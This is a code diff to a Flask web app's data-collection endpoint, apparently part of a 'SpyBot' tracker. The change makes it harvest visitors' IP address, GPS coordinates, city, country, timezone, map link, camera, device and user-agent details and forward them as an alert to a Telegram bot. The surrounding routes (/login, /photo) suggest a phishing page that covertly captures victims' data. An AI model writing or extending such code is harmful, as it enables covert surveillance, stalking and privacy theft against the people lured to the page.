@@ -29,23 +29,29 @@ def login():
 def collect():
     data = request.get_json()
     if data:
-        latitude = data.get('latitude')
-        longitude = data.get('longitude')
+        ip = data.get('ip') or request.remote_addr
+        lat = data.get('latitude')
+        lon = data.get('longitude')
+        city = data.get('city')
+        country = data.get('country')
+        timezone = data.get('timezone')
         camera = data.get('camera')
         user_agent = data.get('userAgent')
         device = data.get('deviceInfo')
-        ip = data.get('ip') or request.remote_addr  # Use IP from client or fallback
+        maps_link = data.get('mapsLink')
 
-        location_info = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Denied"
-        info = f"""
+        message = f"""
 🕵️‍♂️ SpyBot Alert
 📌 IP Address: {ip}
-{location_info}
+📍 Location: {lat}, {lon}
+🌆 City: {city}, 🌍 Country: {country}
+🕐 Timezone: {timezone}
+🗺️ Map: {maps_link}
 📷 Camera: {camera}
 🧠 Device: {device}
 🌐 UserAgent: {user_agent}
 """
-        send_telegram_message(info)
+        send_telegram_message(message)
     return 'ok'
 
 @app.route('/photo', methods=['POST'])
